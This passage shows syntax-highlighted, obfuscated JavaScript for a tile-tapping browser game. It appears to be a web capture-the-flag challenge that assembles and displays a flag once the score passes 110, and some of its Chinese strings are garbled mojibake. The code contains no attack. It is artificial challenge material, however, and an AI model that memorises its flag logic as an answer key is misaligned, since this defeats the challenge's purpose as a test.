class="string">&#x27;HgDLT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1e2bf0,_0x10e0fe</span>)&#123;<span class="keyword">return</span> _0x1e2bf0+_0x10e0fe;&#125;,<span class="string">&#x27;UQPRM&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x433c7f,_0x43ecdf</span>)&#123;<span class="keyword">return</span> _0x433c7f+_0x43ecdf;&#125;&#125;;flag=_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;11&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;12&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](_0xc9cc6[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;13&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>])+flag[<span class="number">0x1</span>],flag[<span class="number">0x7</span>])+flag[<span class="number">0x5</span>],flag[<span class="number">0x2</span>])+flag[<span class="number">0x0</span>],flag[<span class="number">0x4</span>]),flag[<span class="number">0x3</span>]);&#125;<span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x2280df=&#123;<span class="string">&#x27;mMirY&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3306f1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3306f1</span>();&#125;,<span class="string">&#x27;Trirl&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;14&#x27;</span>),<span class="string">&#x27;jTrWv&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;c&#x27;</span>),<span class="string">&#x27;nZzwC&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3cfeea</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3cfeea</span>();&#125;,<span class="string">&#x27;YAIYI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xf36d5d,_0x1ccb30</span>)&#123;<span class="keyword">return</span> _0xf36d5d||_0x1ccb30;&#125;,<span class="string">&#x27;EkFcm&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;15&#x27;</span>),<span class="string">&#x27;BUnIs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x330693,_0x4f4547</span>)&#123;<span class="keyword">return</span> _0x330693==_0x4f4547;&#125;,<span class="string">&#x27;blIGg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3daa21,_0x3b06f5</span>)&#123;<span class="keyword">return</span> _0x3daa21!==_0x3b06f5;&#125;,<span class="string">&#x27;pLYcs&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),<span class="string">&#x27;WmHSk&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;17&#x27;</span>),<span class="string">&#x27;LdBOh&#x27;</span>:<span class="string">&#x27;pNxjJ&#x27;</span>&#125;;<span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;18&#x27;</span>)]);<span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();_0x3b3385[<span class="string">&#x27;appendChild&#x27;</span>](_0x5afcef);<span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0x0</span>;_0xa4a713&lt;<span class="number">0x4</span>;_0xa4a713++)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>)===<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;19&#x27;</span>))&#123;_0x5afcef[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));&#125;<span class="keyword">else</span>&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1b&#x27;</span>)](init);&#125;&#125;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1c&#x27;</span>)](_0x3b3385[<span class="string">&#x27;firstChild&#x27;</span>],<span class="literal">null</span>))&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;16&#x27;</span>),_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1e&#x27;</span>)]))&#123;ev[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">else</span>&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1a&#x27;</span>)](_0x5afcef);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;20&#x27;</span>)],_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;21&#x27;</span>)]))&#123;_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;22&#x27;</span>)](_0x5afcef,_0x3b3385[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;23&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x492bb8=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;24&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),_0x356832=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x492bb8[_0x356832++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:result=!![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:clock=<span class="variable language_">window</span>[<span class="string">&#x27;setInterval&#x27;</span>](_0x2280df[<span class="string">&#x27;Trirl&#x27;</span>],<span class="number">0x1e</span>);<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:$(_0x2280df[<span class="string">&#x27;jTrWv&#x27;</span>])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;25&#x27;</span>)]=<span class="keyword">function</span>(<span class="params">_0x41a97a</span>)&#123;_0x41a97a=_0x1b6288[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;26&#x27;</span>)](_0x41a97a,event);<span class="title function_">judge</span>(_0x41a97a);&#125;;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">for</span>(<span class="keyword">var</span> _0x3c3b91=<span class="number">0x0</span>;_0x3c3b91&lt;<span class="number">0x4</span>;_0x3c3b91++)&#123;_0x2280df[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;27&#x27;</span>)](createrow);&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:<span class="keyword">var</span> _0x1b6288=&#123;<span class="string">&#x27;MOzPj&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5adec6,_0x8e2f0b</span>)&#123;<span class="keyword">return</span> _0x2280df[<span class="string">&#x27;YAIYI&#x27;</span>](_0x5adec6,_0x8e2f0b);&#125;&#125;;<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xea83af=&#123;<span class="string">&#x27;XGzyl&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xec6fe5,_0x4e0795</span>)&#123;<span class="keyword">return</span> _0xec6fe5==_0x4e0795;&#125;,<span class="string">&#x27;TBqmT&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x442e1a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x442e1a</span>();&#125;,<span class="string">&#x27;wCkoL&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2d3224,_0x34b7d6</span>)&#123;<span class="keyword">return</span> _0x2d3224==_0x34b7d6;&#125;,<span class="string">&#x27;lniar&#x27;</span>:<span class="string">&#x27;WeIGh&#x27;</span>&#125;;<span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);<span class="keyword">if</span>(_0xea83af[<span class="string">&#x27;wCkoL&#x27;</span>](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)],<span class="number">0x6</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2a&#x27;</span>)===_0xea83af[<span class="string">&#x27;lniar&#x27;</span>])&#123;_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2b&#x27;</span>)](_0x13b8d4[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2c&#x27;</span>)]);&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2d&#x27;</span>)](rows[i][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0xea83af[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2f&#x27;</span>)](fail);&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0xdb917a=&#123;<span class="string">&#x27;prkYr&#x27;</span>:<span class="string">&#x27;cell&#x27;</span>&#125;;<span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)],_0xdb917a[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;31&#x27;</span>)]];<span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x350dc0[_0x143001]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>);<span class="keyword">return</span> _0x350dc0;&#125;<span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x50dc93=&#123;<span class="string">&#x27;pvEAg&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;kclIZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;34&#x27;</span>),<span class="string">&#x27;kKiZZ&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>),<span class="string">&#x27;TfNvb&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x24d967,_0x2d20a7</span>)&#123;<span class="keyword">return</span> _0x24d967&gt;_0x2d20a7;&#125;,<span class="string">&#x27;ExruN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x20928b,_0x223fd3</span>)&#123;<span class="keyword">return</span> _0x20928b==_0x223fd3;&#125;,<span class="string">&#x27;CPgjs&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3d1bb4</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3d1bb4</span>();&#125;&#125;;<span class="keyword">var</span> _0x7d254e=$(_0x50dc93[<span class="string">&#x27;kKiZZ&#x27;</span>]);<span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;36&#x27;</span>)](_0x7d254e,<span class="literal">null</span>)[<span class="string">&#x27;top&#x27;</span>]);<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;37&#x27;</span>)](speed+_0xcb4af7,<span class="number">0x0</span>))&#123;_0xcb4af7=<span class="number">0x0</span>;&#125;<span class="keyword">else</span>&#123;_0xcb4af7+=speed;&#125;_0x7d254e[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;<span class="title function_">over</span>();<span class="keyword">if</span>(_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3a&#x27;</span>)](_0xcb4af7,<span class="number">0x0</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3b&#x27;</span>)!==<span class="string">&#x27;YeXSy&#x27;</span>)&#123;<span class="keyword">var</span> _0x4b2784=[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),_0x50dc93[<span class="string">&#x27;pvEAg&#x27;</span>],<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>)];<span class="keyword">var</span> _0x357234=<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;32&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;33&#x27;</span>)]()*<span class="number">0x4</span>);_0x4b2784[_0x357234]=_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3c&#x27;</span>)];<span class="keyword">return</span> _0x4b2784;&#125;<span class="keyword">else</span>&#123;_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](createrow);_0x7d254e[<span class="string">&#x27;style&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3e&#x27;</span>);_0x50dc93[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3d&#x27;</span>)](delrow);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;speed+=<span class="number">0x2</span>;<span class="keyword">if</span>(speed==<span class="number">0x14</span>)&#123;<span class="title function_">alert</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;3f&#x27;</span>));&#125;&#125;<span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x9d37d9=&#123;<span class="string">&#x27;eLFjJ&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5cc88e,_0x3b4f5a</span>)&#123;<span class="keyword">return</span> _0x5cc88e!==_0x3b4f5a;&#125;,<span class="string">&#x27;JhtJI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2330d8</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x2330d8</span>();&#125;,<span class="string">&#x27;kPnGu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x506701,_0x733825</span>)&#123;<span class="keyword">return</span> _0x506701&lt;_0x733825;&#125;,<span class="string">&#x27;TSXCa&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x31e405,_0x14dd83</span>)&#123;<span class="keyword">return</span> _0x31e405==_0x14dd83;&#125;&#125;;<span class="keyword">var</span> _0x5d88ab=con[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;28&#x27;</span>)];<span class="keyword">if</span>(_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]==<span class="number">0x5</span>&amp;&amp;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;40&#x27;</span>)](_0x5d88ab[_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]-<span class="number">0x1</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;41&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;42&#x27;</span>)](fail);&#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0x0</span>;_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;43&#x27;</span>)](_0x2f89b3,_0x5d88ab[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;29&#x27;</span>)]);_0x2f89b3++)&#123;<span class="keyword">if</span>(_0x9d37d9[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;44&#x27;</span>)](_0x5d88ab[_0x2f89b3][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;2e&#x27;</span>)],<span class="number">0x1</span>))&#123;_0x9d37d9[<span class="string">&#x27;JhtJI&#x27;</span>](fail);&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x14c114=&#123;<span class="string">&#x27;soqNf&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3480b3,_0xd21da1</span>)&#123;<span class="keyword">return</span> _0x3480b3+_0xd21da1;&#125;,<span class="string">&#x27;txdzn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x246811,_0x259a7c</span>)&#123;<span class="keyword">return</span> _0x246811+_0x259a7c;&#125;,<span class="string">&#x27;XdUQK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x42192d,_0x315028</span>)&#123;<span class="keyword">return</span> _0x42192d+_0x315028;&#125;,<span class="string">&#x27;EyUGz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xe56318,_0x14eeae</span>)&#123;<span class="keyword">return</span> _0xe56318+_0x14eeae;&#125;,<span class="string">&#x27;iOJjI&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x11f4cd</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x11f4cd</span>();&#125;,<span class="string">&#x27;vfoqn&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c1a60,_0x34e3b5</span>)&#123;<span class="keyword">return</span> _0x2c1a60&gt;_0x34e3b5;&#125;,<span class="string">&#x27;MQTqg&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x25788a,_0x13078a</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x25788a</span>(_0x13078a);&#125;,<span class="string">&#x27;sbqYu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4e2d7b,_0x25fda1</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4e2d7b</span>(_0x25fda1);&#125;,<span class="string">&#x27;eWVDT&#x27;</span>:<span class="string">&#x27;æµ£çŠµæ®‘éˆâ‚¬ç¼å ç·±é’å“±x20&#x27;</span>,<span class="string">&#x27;OcpRn&#x27;</span>:<span class="string">&#x27;\x20\x20\x20æµ£çŠµæ®‘flagæ¶“ï¿½&#x27;</span>,<span class="string">&#x27;aAXDM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;45&#x27;</span>),<span class="string">&#x27;ynrUN&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4f2806,_0x5042d9</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4f2806</span>(_0x5042d9);&#125;,<span class="string">&#x27;XUebr&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x38dd19,_0x2d65d2</span>)&#123;<span class="keyword">return</span> _0x38dd19+_0x2d65d2;&#125;,<span class="string">&#x27;hdcqM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;rbpXR&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>),<span class="string">&#x27;tPTze&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;48&#x27;</span>)&#125;;<span class="built_in">clearInterval</span>(clock);result=![];_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;49&#x27;</span>)](check_action);<span class="keyword">if</span>(_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4a&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x6e</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4d&#x27;</span>)!==<span class="string">&#x27;OJnvn&#x27;</span>)&#123;flag=_0x14c114[<span class="string">&#x27;soqNf&#x27;</span>](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4e&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4f&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;50&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>]),flag[<span class="number">0x1</span>])+flag[<span class="number">0x7</span>],flag[<span class="number">0x5</span>])+flag[<span class="number">0x2</span>]+flag[<span class="number">0x0</span>]+flag[<span class="number">0x4</span>],flag[<span class="number">0x3</span>]);&#125;<span class="keyword">else</span>&#123;_0x14c114[<span class="string">&#x27;sbqYu&#x27;</span>](confirm,_0x14c114[<span class="string">&#x27;eWVDT&#x27;</span>]+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;52&#x27;</span>)]+flag);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x14c114[<span class="string">&#x27;aAXDM&#x27;</span>]!==<span class="string">&#x27;EPoSk&#x27;</span>)&#123;_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;53&#x27;</span>)](confirm,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;54&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>)+<span class="built_in">parseInt</span>(_0x14c114[<span class="string">&#x27;ynrUN&#x27;</span>]($,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;56&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]),_0x14c114[<span class="string">&#x27;rbpXR&#x27;</span>]));&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](id);&#125;&#125;<span class="keyword">var</span> _0x35bf64=$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="number">0x0</span>;_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;57&#x27;</span>)];&#125;<span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;<span class="keyword">var</span> _0xf81cd5=&#123;<span class="string">&#x27;QNpbW&#x27;</span>:<span class="string">&#x27;score&#x27;</span>,<span class="string">&#x27;WjLha&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c32d9,_0x4db6b6</span>)&#123;<span class="keyword">return</span> _0x2c32d9+_0x4db6b6;&#125;,<span class="string">&#x27;vfRLA&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>),<span class="string">&#x27;rhAgd&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1892c7,_0x3c5fad</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x1892c7</span>(_0x3c5fad);&#125;,<span class="string">&#x27;LWTJm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x563e3a,_0x40d179</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x563e3a</span>(_0x40d179);&#125;,<span class="string">&#x27;hbFUP&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4658e5,_0x694647</span>)&#123;<span class="keyword">return</span> _0x4658e5+_0x694647;&#125;,<span class="string">&#x27;yLyYD&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x51620a,_0x1486d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x51620a</span>(_0x1486d2);&#125;,<span class="string">&#x27;xwcvM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>),<span class="string">&#x27;KRCVK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4ac062,_0x4ad8e7</span>)&#123;<span class="keyword">return</span> _0x4ac062!=_0x4ad8e7;&#125;,<span class="string">&#x27;PfsEX&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;yhNxF&#x27;</span>:<span class="string">&#x27;OLkpt&#x27;</span>,<span class="string">&#x27;nDvCe&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3f570c</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3f570c</span>();&#125;&#125;;<span class="keyword">if</span>(_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="string">&#x27;className&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5a&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;xwcvM&#x27;</span>])==-<span class="number">0x1</span>&amp;&amp;_0xf81cd5[<span class="string">&#x27;KRCVK&#x27;</span>](_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)]),-<span class="number">0x1</span>))&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">if</span>(_0x545af0[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>))!=-<span class="number">0x1</span>)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5d&#x27;</span>)!==_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5e&#x27;</span>)])&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)]=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)];_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass&#x27;</span>]=<span class="number">0x1</span>;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5f&#x27;</span>)](score);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x22a3f1=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;60&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;61&#x27;</span>)](<span class="string">&#x27;|&#x27;</span>),_0x42aa57=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x22a3f1[_0x42aa57++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="string">&#x27;innerHTML&#x27;</span>]=<span class="number">0x0</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:<span class="keyword">if</span>(<span class="built_in">parseInt</span>($(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])&gt;<span class="number">0x6e</span>)&#123;<span class="title function_">confirm</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;63&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;vfRLA&#x27;</span>],<span 